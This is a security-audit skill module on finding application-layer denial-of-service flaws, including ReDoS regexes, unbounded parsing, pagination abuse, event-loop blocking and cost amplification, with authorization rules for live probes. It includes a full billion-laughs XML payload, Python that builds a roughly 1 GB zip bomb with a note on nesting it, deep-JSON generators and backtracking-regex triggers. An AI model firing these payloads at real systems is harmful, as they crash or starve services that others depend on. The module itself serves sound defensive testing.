---
name: denial-of-service-checks
description: Detects application-layer denial-of-service and resource-exhaustion flaws (ReDoS regexes, unbounded parsing and allocation, quadratic algorithms, pagination abuse, event-loop blocking, cache/log fill, third-party cost amplification) via static inspection plus bounded live probes.
category_slug: DOS
cwe: [CWE-400, CWE-1333, CWE-409]
owasp: A05:2021 – Security Misconfiguration
---

# Denial of Service & Resource Exhaustion (Application Layer)

Primary CWE mappings used throughout this module:

| CWE | Name | Used for |
| --- | --- | --- |
| CWE-400 | Uncontrolled Resource Consumption | General missing-limits DoS findings |
| CWE-1333 | Inefficient Regular Expression Complexity | ReDoS findings |
| CWE-409 | Improper Handling of Highly Compressed Data (Data Amplification) | Zip/decompression bomb findings |

Secondary CWEs referenced inline where they fit better than the three above: CWE-405 (Asymmetric Resource Consumption / Amplification), CWE-407 (Inefficient Algorithmic Complexity), CWE-674 (Uncontrolled Recursion), CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-776 (Improper Restriction of Recursive Entity References in DTDs, i.e. XML entity expansion), CWE-789 (Memory Allocation with Excessive Size Value). All of these are verified CWE identifiers; do not invent additional ones.

OWASP Top 10 2021 mapping: A05:2021 – Security Misconfiguration covers missing body-size limits, unsafe parser defaults, and absent timeouts. Findings rooted in algorithm/design choices (quadratic logic, unbounded GraphQL fanout) additionally map to A04:2021 – Insecure Design; state both when relevant.

## Scope & Objectives

Audit the application layer only. You are looking for code and configuration that lets ONE small request — or a handful of requests — consume disproportionate CPU, memory, disk, connection slots, or money.

In scope:

1. **ReDoS**: regular expressions with catastrophic backtracking executed against attacker-controlled strings.
2. **Unbounded allocation/parsing**: request bodies, uploads, XML, zip/tar archives, base64 blobs parsed or decompressed with no size, count, depth, or ratio caps.
3. **Algorithmic complexity attacks**: O(n^2)+ work driven by user-controlled collection sizes; hash-collision flooding; N+1 query amplification.
4. **Pagination/enumeration cost**: missing or clamped-too-high `LIMIT`; export/report endpoints materializing entire datasets in memory.
5. **Async/event-loop blocking**: synchronous CPU-heavy work starving Node event loops or fixed thread pools; connection-pool exhaustion.
6. **Cache/log fill exhaustion**: unauthenticated cache-key flooding, session-creation spam, log-flood disk fill via error handlers dumping huge bodies.
7. **Third-party cost amplification**: endpoints that trigger paid SMS/email/transcode/API calls per request without throttle, quota, or idempotency.

Out of scope (note as CONFIG cross-ref only, do not audit deeply):

- Volumetric network floods (L3/L4), SYN floods, bandwidth exhaustion — infrastructure/DDoS-provider territory.
- Slowloris-style socket holding mitigated at reverse proxy/LB (`client_body_timeout`, `proxy_read_timeout`, LB idle timeout). Record what you see in proxy config; do not attempt exploitation.
- OS-level limits (ulimits, container memory ceilings) — record them because they determine blast radius (OOM kill vs host death), not as findings themselves.

Objectives for the executor:

1. Enumerate every sink where input size, count, depth, or content drives resource cost.
2. Prove or refute superlinear behavior by READING the code (loop structure, regex shape, framework defaults), not by firing traffic.
3. Confirm the highest-value candidates with MODEST live probes (single requests, seconds-long differentials) inside an authorized window.
4. Report with CWE, reproduction steps, remediation, and a bounded verification plan.

## Prerequisites & Vocabulary

Zero-background primer: the terms this module uses, one line each. Deeper plain-language
explanations for every class live in the repository GUIDE.md glossary.

- **amplification**: a tiny request forcing huge work; the work-to-input ratio is the weapon
- **catastrophic backtracking**: a pattern-matching engine retrying exponentially many splits on crafted input
- **ReDoS**: a server hang caused by such a regular expression
- **decompression bomb**: a small compressed upload that expands to gigabytes when processed
- **unbounded allocation**: a parser reserving memory straight from attacker-supplied sizes or counts
- **clamp**: any cap (bytes, items, depth, dollars) between input and expensive work
- **event-loop blocking**: one slow synchronous task freezing all request handling in a shared worker
- **taint flow / source→sink**: path untrusted data travels from entry point to dangerous function

## Mental Model

Everything in this module is an **amplification attack**: the attacker sends N bytes and forces the server to spend M units of work, where M/N is the weapon. Your job is to find the largest achievable M/N per endpoint.

Four resource pools can be drained, and each has characteristic signatures:

| Pool | Attack classes | Typical signature in code |
| --- | --- | --- |
| CPU | ReDoS, quadratic loops, sort/comparator abuse, hash collisions, transcodes | Backtracking regex shapes; nested loops over request arrays; string concatenation in loops; sync crypto/image work |
| Memory | Deep JSON/XML, decompression bombs, load-whole-file imports, base64 decode bombs, export-to-memory | Parsers with no depth cap; `extractall()`; `.toArray()`; `Model.objects.all()` serialized wholesale; `bytearray(n)` sized from input |
| Disk / handles | Log flood, temp-file spillover, session-store spam, cache growth | Error handlers logging `req.body`; caches with no TTL/maxmemory; upload spool directories never pruned |
| Money | Bill-bomb via paid APIs | SMS/email senders called synchronously per request; webhook-triggered video transcodes with no quota |

Two structural questions classify every finding:

1. **Single request vs many**: Does ONE crafted request hang/OOM/fill a worker (highest severity), or must the attacker sustain traffic (lower severity, rate limiting helps)?
2. **Bounded vs unbounded cost**: Is there ANY clamp between attacker input and the expensive operation (bytes, items, depth, iterations, dollars)? No clamp = finding candidate. Clamp present = verify the clamp cannot be bypassed (`limit=-1`, `limit=99999999`, compressed input expanding past the byte cap, proxy limit skipped by direct-to-origin access).

Language/engine reality check you MUST internalize before judging regexes: not every `(a+)+` shaped pattern is exploitable. RE2-family engines (Go `regexp`, Rust `regex`) guarantee linear time and cannot catastrophically backtrack. Everything else in mainstream use (V8/JavaScript, Python `re`, PCRE/PHP, .NET, Java `java.util.regex`, Ruby Onigmo) backtracks and CAN blow up. Judge the pattern AGAINST THE ENGINE THAT RUNS IT.

Carry this closing question into every candidate finding before you spend any probe budget: what is the most expensive thing ONE request can force this application to do?

## What To Check

### ReDoS: Catastrophic Backtracking Regexes on User Input

1. Inventory every regular expression that executes against attacker-controlled data: route validators, middleware (email/username/slug checks), input-sanitization helpers, log-scrubbers that run on request bodies, webhook signature parsers, CSV/HTML line matchers.
2. For each, classify the engine that runs it (see engine table in Patterns & Signatures). Skip RE2-family engines (Go stdlib `regexp`, Rust `regex`) for backtracking findings — they are linear-time by construction; instead flag any place a USER-SUPPLIED PATTERN ITSELF is compiled (`new RegExp(req.query.q)`, `re.compile(user_input)`): hostile patterns are their own DoS sink regardless of engine.
3. Match candidate patterns against the vulnerable-shape catalog: `(a+)+$`, `(a|a)*$`, `(.*a){20}`, nested quantifiers like `(\d+)*`, overlapping alternations like `(a|ab)+`, quantified groups over dot-star.
4. Check whether a cheap length gate runs BEFORE the regex (`if len(s) > 256: reject`). A tight length cap converts even an evil pattern into a bounded-cost operation — record its exact bound and confirm it precedes matching.
5. Run the local doubling-time harness (Patterns & Signatures) on every surviving candidate; classify linear/quadratic/exponential from the growth ratios.

### Unbounded Request Parsing and Allocation

1. Locate every body parser/multipart handler and compare its configured byte cap against the table in Where To Look. Absent configuration means framework default — verify the actual default rather than assuming a safe one (Go `net/http` has NO body cap at all).
2. Trace upload flows: does anything read the full body/file into memory (`req.file.buffer`, `MemoryStream`, `byte[] b = ...ReadAllBytes()`, `file.read()`) before validation?
3. Check JSON handling depth/count exposure: recursive schema-less parsers (`JSON.parse` on arbitrary bodies, Python `json.loads` of multi-MB payloads) plus endpoints accepting arrays-of-arrays. Confirm framework-level field-count caps exist (Django `DATA_UPLOAD_MAX_NUMBER_FIELDS`, PHP `max_input_vars`, Rack query-parser limits) or note their absence.
4. Inspect XML ingestion for entity expansion readiness: DTDs/DOCTYPE accepted, external entities resolvable, no feature flags disabling them (cross-ref deserialization.md; canonical billion-laughs payload in Exploitation & Reproduction; CWE-776).
5. Inspect archive ingestion (zip/tar/gz) for decompression bombs: extraction without cumulative output-byte cap, entry-count cap, or compression-ratio threshold; nested archives re-extracted recursively (CWE-409; tar-specific path/count issues cross-ref file-handling.md).
6. Find base64 decode targets (`Buffer.from(x,'base64')`, `base64.b64decode`, `FromBase64String`) where decoded size is ~4/3 the attacker-chosen input length and the result is buffered wholesale or fed to an image decoder.

### Algorithmic Complexity on User-Controlled Collections

1. Grep for loops nested over request-derived collections (`for item in body.items:` wrapping another scan; `.contains`/`.includes` inside a loop = O(n^2)).
2. In Java/C#, hunt quadratic string building: `string +=` or `result = result + x` inside loops instead of `StringBuilder`/`System.Text.StringBuilder`.
3. Assess hash-collision exposure: structures keyed directly by attacker strings where the hash is deterministic (Java `String.hashCode` is `h = 31*h + c`; historically exploited as "HashDoS" against PHP and Java containers via crafted POST parameter floods). Modern mitigations: randomized seeds (Python/Ruby SipHash), parameter-count caps (PHP `max_input_vars` default 1000, Tomcat POST param limits). Audit CUSTOM caches/maps keyed by user strings without entry caps.
4. Note comparator-driven sort attacks only when user input reaches a comparator function; flag inconsistent comparators (can crash TimSort in Java).
5. Hunt N+1 amplification: ORM lazy associations accessed inside loops over request-sized lists (Django FK access in loop without `select_related`/`prefetch_related`; Rails association calls in `each` blocks without `includes`; JPA `FetchType.LAZY` walked in a for-loop; SQLAlchemy lazy loads in serializers). Each extra list element adds a DB round-trip — an attacker sending 10k-element arrays forces 10k queries.
6. GraphQL resolvers: fanout across nested list fields multiplies the same N+1 problem; check for depth limiting and cost/complexity analysis (cross-ref api-security.md).

### Pagination and Enumeration Cost

1. For every list endpoint, find how `limit`/`page`/`offset` reach SQL/ORM: is there a DEFAULT when omitted, and a hard UPPER CLAMP? `limit = min(params[:per_page] || 20, 100)` is safe; `LIMIT #{params['limit']}` with no clamp is not.
2. Probe acceptance of absurd values in code review terms: `?limit=99999999&page=1`, `page_size=2147483647`, negative limits (`limit=-1` sometimes bypasses clamps entirely), non-numeric garbage causing full scans via exception fallback.
3. Find export/report/download features materializing whole datasets: `.all()` piped into a serializer, `find({}).toArray()` then `res.json(...)`, `Model.objects.all()` wrapped in `JsonResponse`. These are memory bombs proportional to table size.
4. Flag per-request `COUNT(*)` over unbounded tables and cursor-less "load more" designs that re-scan from offset 0 repeatedly.

### Event-Loop Blocking and Thread-Pool Starvation

1. On Node: grep for synchronous CPU/blocking APIs reachable from request handlers: `crypto.pbkdf2Sync` (iteration counts above ~100k pin a core per request), `bcrypt.hashSync`/`compareSync`, `child_process.execSync/spawnSync`, `fs.readFileSync` on uploads, `zlib.inflateSync` on client data, `JSON.parse` of multi-MB strings, synchronous image ops (jimp-style). One blocked event loop stalls ALL concurrent requests.
2. Check async-but-pooled work for starvation math: libuv threadpool default is 4 (`UV_THREADPOOL_SIZE`); many concurrent `crypto.pbkdf2`/fs/zlib calls queue behind it. Verify pool sizing rationale exists if heavy pooled work is present.
3. Record HTTP server timeout fields: Node ≥18 applies `server.requestTimeout` (default 300000 ms) and `headersTimeout` (60000 ms); Go `http.Server` needs explicit `ReadTimeout`, `ReadHeaderTimeout`, `WriteTimeout`, `IdleTimeout` — zero values mean forever.
4. Check DB/connection pool capacities versus worst-case concurrent demand: `pg` Pool default max 10, HikariCP `maximumPoolSize` default 10. Slow endpoints (the other findings in this module) holding these slots turn CPU DoS into availability failure of the whole app.
5. Slowloris-style socket holding belongs to infra (nginx/LB timeouts) — record CONFIG state only.

### Cache and Log Fill

1. Identify caches keyed by raw user input (URL path, query, header, email) with no TTL and no cardinality cap: each distinct value creates a permanent entry → unauthenticated fill attack. Check Redis `maxmemory` (default 0 = unlimited) and `maxmemory-policy` (default `noeviction`).
2. Check session-store creation policy: do unauthenticated requests allocate sessions (files in `/var/lib/php/sessions`, rows in a session table, entries in Redis)? Session-creation spam is a classic fill vector (cross-ref authn-session.md).
3. Inspect error handlers and log statements for full payload dumps (`logger.error("...", exc_info=True, extra={"body": req.body})`, `console.error(req.body)`): repeated huge bodies fill disk. Verify log rotation exists (logrotate units, Docker `json-file` `max-size`/`max-file`, Winston daily rotate).

### Third-Party Cost Amplification

1. List endpoints that synchronously trigger paid calls: SMS/voice (Twilio-style SDKs), transactional email, payment intents, address verification, AI/inference APIs, media transcodes (ffmpeg spawns), PDF generation.
2. For each, verify three controls exist: per-user/per-IP rate limit (cross-ref api-security.md), idempotency key or dedup window preventing replay, and an async job boundary so cost accrues off the request path with quotas.
3. Check webhooks/importers that cascade third-party calls per item (import 50k contacts → 50k emails queued): look for batch caps and spend alerts.

## Where To Look

### Body/upload limit configuration by stack (exact keys and defaults)

| Stack | Config location | Key(s) | Default |
| --- | --- | --- | --- |
| Node/Express | app bootstrap (`app.use(express.json(...))`) | `express.json({ limit })`, `express.urlencoded({ limit })` | 100kb per parser |
| Node/multer | multer init | `multer({ limits: { fileSize, files } })` | none unless set (streamed, but uncapped) |
| Django | `settings.py` | `DATA_UPLOAD_MAX_MEMORY_SIZE`, `FILE_UPLOAD_MAX_MEMORY_SIZE`, `DATA_UPLOAD_MAX_NUMBER_FIELDS` | 2621440 bytes, 2621440 bytes, 1000 fields |
| Flask | app config | `MAX_CONTENT_LENGTH` | unset = unlimited |
| FastAPI/Starlette | ASGI app/middleware | no built-in body cap | unlimited — must add middleware |
| Spring Boot (servlet) | `application.properties`/`.yml` | `spring.servlet.multipart.max-file-size`, `spring.servlet.multipart.max-request-size` | 1MB / 10MB |
| Spring WebFlux | same files | `spring.codec.max-in-memory-size` | 256KB |
| ASP.NET Core | `Program.cs`/`Startup.cs` Kestrel config; attributes | `ConfigureKestrel(o => o.Limits.MaxRequestBodySize)`, `[RequestSizeLimit]`, `[RequestFormLimits(MultipartBodyLengthLimit=...)]` | 30,000,000 bytes (~28.6 MiB); multipart form part limit 128 MB |
| ASP.NET (IIS hosting) | `web.config` | `<requestLimits maxAllowedContentLength>` | 30,000,000 bytes |
| PHP | `php.ini` | `post_max_size`, `upload_max_filesize`, `memory_limit`, `max_input_vars` | commonly 8M / 2M / 128M / 1000 (verify deployed ini) |
| Ruby/Rails | Rack layer | `Rack::QueryParser` param count/depth guards; ActiveStorage blob size validations | Rack enforces param limits; verify gem version is current |
| Go | handler code | `http.MaxBytesReader(w, r.Body, n)`; `http.Server{ReadTimeout, ReadHeaderTimeout, WriteTimeout, IdleTimeout}` | NO body cap; timeouts zero = never |
| nginx (front) | `nginx.conf` / site blocks | `client_max_body_size` (0 disables!), `client_body_timeout`, `proxy_read_timeout`, `proxy_connect_timeout` | 1m |

Treat nginx/front-proxy caps as the OUTER boundary only: direct-to-origin access (internal DNS, port 8080, container networking) bypasses them. The application-level cap is what you audit hardest.

### Other high-yield file locations

| Target | Look in |
| --- | --- |
| Regex call sites | validator/util directories; route files; middleware chains; `Pattern.compile`/`new RegExp(`/`re.compile(`/`preg_`/`Regexp.new` occurrences |
| Import/export features | controllers named `import/export/bulk/csv/report`; admin routers; background job classes |
| XML parsing | SOAP endpoints, SAML consumers, RSS/feed fetchers, config-upload features |
| Archive handling | upload processors, backup-restore features, static-asset pipelines |
| Cache/session stores | Redis clients and their config files (`redis.conf`: `maxmemory`, `maxmemory-policy`), session store initializers |
| Log plumbing | logger setup files, global error handlers, `logrotate.d` units, Docker/K8s log driver options |
| Job queues | worker entrypoints, queue definitions (BullMQ/Celery/Sidekiq/Hangfire/asynq) |
| Proxy tier | `nginx.conf`, Caddyfile, HAProxy cfg, ingress annotations — CONFIG cross-ref for timeouts/body size/rate limits |

The next section gives you the executable signatures to run over these locations.

## Patterns & Signatures

### Vulnerable-shape catalog

| Pattern | Language(s) at risk | Risk | Fix |
| --- | --- | --- | --- |
| `(a+)+$`, `^(\d+)*$` | V8/JavaScript, Python `re`, PCRE/PHP, .NET, Java, Ruby | Exponential backtracking when trailing chars prevent a match (CWE-1333) | Rewrite with atomic/possessive constructs or migrate engine (safe-alternatives table below) |
| `(a|a)*$`, `(a|ab)+$` | same five engines | Overlapping or shared-prefix alternations multiply match paths combinatorially | Collapse alternation into a single character class: `[ab]+` |
| `(.*a){20}` | same five engines | Dot-star rescan per repetition; polynomial blowup on failure | Anchor both ends, replace `.*` with explicit negated class, length-gate input first |
| `(.*)*`, `^(.+)+$` | same five engines | Redundant outer quantifier over greedy group ("classic explode") | Delete the redundant outer quantifier |
| `^(\w+\s?)*$` word-splitters | same five engines | Inner optional token under star explodes path count on long non-matching tails | Validate with `split()`/tokenize instead of one mega-regex |
| User-supplied PATTERN compiled at runtime (`new RegExp(input)`, `re.compile(input)`, `Pattern.compile(userStr)`) | ALL engines including Go/Rust RE2 | Attacker controls both pattern and subject; even linear-time engines pay per-request compile cost | Never compile attacker-controlled patterns; use fixed allowlisted patterns keyed by name |

### Engine differences (judge every pattern against ITS engine)

| Engine / runtime | Backtracks? | Timeout default | Notes and mitigations |
| --- | --- | --- | --- |
| Go stdlib `regexp` (RE2 semantics), Rust `regex` crate | No | n/a | Linear-time guarantee; immune to catastrophic backtracking by construction. No backreferences/lookarounds; ported patterns can silently change meaning — run pattern unit tests after migration |
| JavaScript V8 (Node.js, browsers) | Yes | None | No built-in timeout mechanism at all. JS supports neither atomic groups nor possessive quantifiers. Mitigate with npm `re2` package, hand-written validators, or strict input-length gates before matching |
| Python `re` | Yes | None | PyPI `regex` module accepts a `timeout` kwarg (`regex.search(p, s, timeout=0.5)`); Python 3.11+ `re` supports atomic groups `(?>...)` and possessive quantifiers `++`; `google-re2` bindings exist |
| PCRE / PHP `preg_*` | Yes | None, but `pcre.backtrack_limit` (default 1,000,000 steps) aborts runaway matches | The limit caps worst case but CPU still burns up to the cap per call; `preg_match()` returns false on limit hit (silently swallows matches). PHP 7.3+ supports atomic groups and possessive quantifiers |
| .NET `System.Text.RegularExpressions` | Yes | Infinite unless a `TimeSpan` is passed | Always construct with timeout: `new Regex(pattern, options, TimeSpan.FromMilliseconds(500))`. Atomic groups supported broadly; possessive quantifiers since .NET 7 |
| Java `java.util.regex` | Yes | None; matching does not respond to `Thread.interrupt()` | Possessive quantifiers and atomic groups supported natively; drop-in RE2/J library (`com.google.re2j`) is linear-time; otherwise run matches in an executor thread bounded by `Future.get(n, TimeUnit.SECONDS)` |
| Ruby Regexp (Onigmo) | Yes | nil unless set; Ruby >= 3.2 global `Regexp.timeout = 5` (seconds) | Set the global timeout at boot; atomic groups `(?>...)` supported |

### Safe-alternatives quick reference

| Need | JS/Node | Python | Java | .NET | PHP | Ruby | Go |
| --- | --- | --- | --- | --- | --- | --- | --- |
| Bounded regex execution | `re2` npm package | `regex` module + `timeout=` | RE2/J or executor+`Future.get(timeout)` | `Regex` ctor with `TimeSpan` | keep default `pcre.backtrack_limit`; add length gate | `Regexp.timeout = 5` at boot | already bounded |
| Non-backtracking rewrite tools | none in-language (no atomic/possessive) | 3.11+ atomic `(?>..)` / possessive `++` | atomic `(?>..)` / possessive `++` | atomic `(?>..)`; possessive `.NET 7+` | atomic `(?>..)` / possessive `++` (PHP 7.3+) | atomic `(?>..)` | n/a (already RE2) |
| Replace validation regexes entirely | bespoke parsers, `URL`/`Intl` APIs | stdlib parsers (`ipaddress`, `email.utils.parseaddr`) | dedicated validators (hibernate-validator constraints) | `Uri.TryCreate`, `MailAddress.TryCreate` | `filter_var(...)` | URI/Email validator gems | `net.ParseIP`, `mail.ParseAddress` |

### ripgrep signatures (run from repo root; no lookarounds used)

Candidate catastrophic-backtracking shapes (nested quantified groups):

```regex
\([^()]{1,60}[+*][^()]{0,60}\)[+*{]
```

Quantified wildcard/dot groups such as `(.*a){20}`:

```regex
\(\.[^()]{0,40}[+*]\)\{[0-9]+
```

Overlapping alternation under repetition:

```regex
\([^()]{1,60}\|[^()]{1,60}\)[+*]
```

Regex construction sites to review manually (does any argument derive from request data?):

```regex
(new RegExp\(|re\.compile\(|Pattern\.compile\(|preg_match\(|preg_replace\(|Regexp\.new\(|regexp\.MustCompile|new Regex\(|Regex\.Match\()
```

Node synchronous CPU/blocking calls reachable from handlers:

```regex
(pbkdf2Sync|scryptSync|generateKeyPairSync|randomFillSync|hashSync|compareSync|execSync|spawnSync|readFileSync|inflateSync|gzipSync)
```

Whole-file-into-memory reads on upload paths:

```regex
(ReadAllBytes|readAllBytes|file_get_contents|os\.ReadFile|ioutil\.ReadFile|fs\.readFileSync|MemoryStream|toByteArray\(\))
```

Archive extraction sinks:

```regex
(extractall|ExtractToDirectory|ZipFile\.OpenRead|archive/zip|archive/tar|adm-zip|unzipper|extractTo|tar -x)
```

Unbounded pagination indicators:

```regex
(LIMIT\s*\$\{|LIMIT " ?\+|limit\s*=\s*(int|parseInt|Integer\.parseInt)|params\[.?limit|\bper_page\b|\bpage_size\b)
```

Quadratic string building in Java/C# loops (then confirm loop context by reading):

```regex
(String|string)\s+(result|output|sb|builder|csv|html|msg|text)\w*\s*(=|"")?\s*\+?=
```

Missing-limit ORM full scans:

```regex
(\.objects\.all\(\)|findAll\(\)|find\(\{\}\)\s*\.toArray|\.all\b.*each|Model\.find\(\)\s*$)
```

XML parser hardening flags present-or-absent check:

```regex
(defusedxml|disallow-doctype-decl|setFeature\(.http://apache.org/xml/features/disallow|XmlResolver\s*=\s*null|resolve_entities|libxml_disable_entity_loader)
```

### Local regex-timing test harness (run OFFLINE against your own codebase's candidates)

Doubling method: time one match at input length n, then 2n, 4n... Because n doubles each round, LINEAR cost shows a constant ~2x growth ratio, quadratic ~4x, cubic ~8x, exponential shows ratios that keep CLIMBING (4x, then 16x, then budget hit). A hard safety budget aborts before anything hangs your workstation.

Python (`python3 harness.py`):

```python
import re, time

def probe(pattern, char="a", suffix="!", start=16, max_len=8192, budget_ms=500.0):
    rx = re.compile(pattern)
    n, prev = start, None
    while n <= max_len:
        s = char * n + suffix
        t0 = time.perf_counter()
        try:
            rx.search(s)
        except Exception as e:
            print("engine error:", e)
            return
        ms = (time.perf_counter() - t0) * 1000.0
        ratio = (ms / prev) if prev else 0.0
        tag = ""
        if prev:
            if ratio >= 4.0 and ms > 1.0:
                tag = "  <-- SUPERLINEAR"
        print(f"n={n:6d} {ms:10.3f} ms growth={ratio:6.2f}x{tag}")
        if ms > budget_ms:
            print("BUDGET HIT -> treat as catastrophic backtracking; stop scaling.")
            return
        prev, n = ms, n * 2

probe(r"(a+)+$")           # expect climbing ratios then budget hit
probe(r"^[A-Za-z0-9_.-]+$") # expect steady ~2x (linear, safe shape)
```

Node equivalent (`node harness.js`; use `performance.now()`, NOT `Date.now()` whose 1 ms resolution hides early steps):

```js
const { performance } = require("node:perf_hooks");

function probe(re, ch = "a", suffix = "!", start = 16, maxLen = 8192, budgetMs = 500) {
  let n = start, prev = null;
  while (n <= maxLen) {
    const s = ch.repeat(n) + suffix;
    const t0 = performance.now();
    re.test(s);
    const ms = performance.now() - t0;
    const ratio = prev ? ms / prev : 0;
    console.log(
      `n=${String(n).padStart(6)} ${ms.toFixed(3)} ms growth=${ratio.toFixed(2)}x` +
      (prev && ratio >= 4 && ms > 1 ? "  <-- SUPERLINEAR" : "")
    );
    if (ms > budgetMs) {
      console.log("BUDGET HIT -> treat as catastrophic backtracking; stop scaling.");
      return;
    }
    prev = ms;
    n *= 2;
  }
}

probe(/^(a+)+$/);
probe(/^[A-Za-z0-9_.-]+$/);
```

Interpretation rules:

| Observed growth per doubling | Verdict |
| --- | --- |
| ~2x each step, stays flat | Linear — acceptable (still record if applied to multi-MB inputs inside hot paths) |
| steady ~4x | Quadratic — fix or clamp input length tightly (CWE-407) |
| ratios climbing round over round, or early budget hit | Exponential/catastrophic — CWE-1333 finding; remediate before any live probing |

For patterns where the dangerous tail differs (e.g., digits), pass a different `char`/`suffix` (harness parameters) matching the character classes in the pattern; a trigger that never matches is what maximizes backtracking.

## Taint Tracing Guidance

Model every DoS sink as source -> missing-clamp -> expensive operation. Sources: request body/query/path/header values, uploaded files (bytes, count, names), webhook bodies, message-queue messages, and second-order data stored earlier from users (rows replayed into exports/admin lists).

Sink inventory and the clamp category each requires:

| Sink class | Example sinks per stack | Required clamp category |
| --- | --- | --- |
| Regex execution | `re.match/search`, `.match(/re/)`, `Pattern.compile` + `Matcher.matches`, `preg_match`, `Regex.IsMatch`, `Regexp.new` | Input byte-length gate BEFORE match; fixed non-attacker-controlled pattern; engine-level timeout |
| Pattern compilation | `new RegExp(v)`, `re.compile(v)` | Must not accept attacker strings at all |
| Allocation sized by input | `make([]byte, n)` Go, `new byte[n]` Java/C#, `bytearray(n)` Python, `Buffer.alloc(n)` JS, `String(n)` repeat tricks | n <= constant derived from server config, not raw input |
| Collection-size-driven loops | iterating `req.body.items[]`, CSV rows, GraphQL list fields | Max item count enforced at parse boundary; algorithm no worse than O(n log n) |
| SQL LIMIT/OFFSET construction | string-interpolated `LIMIT`, ORM `.limit(params.limit)` | Default when absent + hard upper clamp + integer parse |
| Archive extractors | `zipfile.extractall`, `archive/zip` io.Copy loops, `SharpCompress`, `System.IO.Compression` | Cumulative output bytes, entry count, compression-ratio threshold |
| XML parser instances | `DocumentBuilderFactory`, `lxml.etree.fromstring`, `XmlReader`, `simplexml_load_string`, `xml.Decoder` | DOCTYPE/DTD disabled or entity expansion off |
| Cache setters | Redis `SET key value` with key containing user input | TTL mandatory; key-cardinality ceiling; eviction policy configured |
| Paid-API SDK calls | SMS/email/transcode clients called inline in handlers | Rate limit + idempotency/dedup + async queue quota |

Tracing procedure:

1. Start from the sink greps above; open each hit.
2. Walk backward to the nearest trust boundary; write down every validation between boundary and sink WITH its exact constants (e.g., `if len(s) > 256: reject`).
3. Classify which clamp categories from the table are present. A missing category is a candidate finding even if another category exists (a body-size cap does not bound a quadratic loop over 100k small items).
4. Treat framework defaults as clamps ONLY after verifying them in code/config (Express json 100kb default counts; Go net/http uncapped does not).
5. Record findings as path/to/file.ext:line with the missing clamp named, so Remediation can cite exact keys later.

Worked micro-example (Node): `app.post("/search", (req,res) => res.json(items.filter(i => new RegExp(req.body.q).test(i.name))))`. Source `req.body.q` reaches TWO sinks: pattern compilation (attacker-chosen regex = hostile-pattern DoS on ANY engine) and an O(items x pattern) scan per request. Fix direction: never compile user patterns; switch to indexed substring search. Trace both facts in the finding.

## Exploitation & Reproduction

> **Authorization rules for this entire section:** run these procedures ONLY against systems you are contractually authorized to test, ideally staging. Static reading is your primary evidence; live probes are corroboration. Every procedure below uses between ONE and FOUR requests — never loops, floods, or sustained load. STOP IMMEDIATELY if you observe any of: request latency above 30 seconds, HTTP 502/503/504, OOM restart evidence, or disk/memory alerts. Confirm complexity by reading the code first; measure only what you have already proven on paper.

Measure latency with curl's built-in timer rather than external tools:

```bash
curl -s -o /dev/null -w 'status=%{http_code} time_total=%{time_total}s\n' \
  -X POST https://TARGET/api/validate \
  -H 'Content-Type: application/json' \
  -d '{"email":"user@example.com"}'
```

### Procedure A: ReDoS confirmation (baseline 1 request + probe 1 request)

1. Extract the candidate regex from source (Patterns & Signatures greps) and confirm superlinear growth with the OFFLINE harness.
2. Identify the endpoint whose handler executes it (e.g., `POST /api/validate` checking an email field).
3. Baseline once with a benign value; record `time_total`.
4. Send the matching trigger string ONCE as the same field (see payload cheat-sheet below).
5. Expected observables: benign ~50 ms vs probe multi-second hang; upstream gateway 502/504 if a proxy timeout fires first; APM trace showing one stuck worker thread. If the request hangs past your client timeout, that alone confirms the finding — do not retry to "make sure".

### Procedure B: deep/nested JSON parse cost (3 requests total)

1. Generate locally, escalating depth modestly:

```bash
python3 -c "print('['*50 + '0' + ']'*50)" > d50.json
python3 -c "print('['*200 + '0' + ']'*200)" > d200.json
python3 -c "print('['*800 + '0' + ']'*800)" > d800.json
```

2. POST each to the JSON endpoint in sequence, recording `time_total` and status.
3. Expected observables: sharply increasing parse latency across the three; immediate `400/413` responses indicate a working depth/size cap (remediated state); a crash/restart at d800 indicates unbounded recursion handling (CWE-674).

### Procedure C: XML entity expansion (exactly 1 request)

1. Send the canonical billion-laughs document ONCE to any endpoint consuming XML (SOAP, SAML metadata, feed import):

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

2. Expected observables: seconds-long delay or 500 with parser error = vulnerable (CWE-776); instant `400/403` rejecting DOCTYPE = remediated (hardened parser). Cross-reference deserialization.md for entity/XXE remediation detail. One request only — the payload self-amplifies ~10^9.

### Procedure D: decompression bomb upload (exactly 1 upload)

1. Create a small high-ratio archive locally:

```python
import zipfile, io
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("zeros.bin", b"\x00" * (1024 ** 3))   # 1 GB of zeros -> roughly 1 MB stored
open("bomb.zip", "wb").write(buf.getvalue())
```

Nested layers multiply the effect: place bomb.zip itself as an entry inside a second archive (and repeat); each layer compounds the compression ratio. Keep YOUR test file to the single-layer ~1 GB-output version — enough to prove the point.

2. Upload once to the import/archive endpoint while watching response time and service memory (container metrics or `/proc/<pid>/status` VmRSS).
3. Expected observables: response delayed by tens of seconds proportional to extraction work; memory spike near the output size; OOM restart evidence afterwards (`docker inspect <id>` shows `OOMKilled: true`, or k8s pod restart count increments, or dmesg oom-killer lines). Instant `400/413` = ratio/output guards present (CWE-409 remediated).

### Procedure E: pagination/enumeration cost (2 requests)

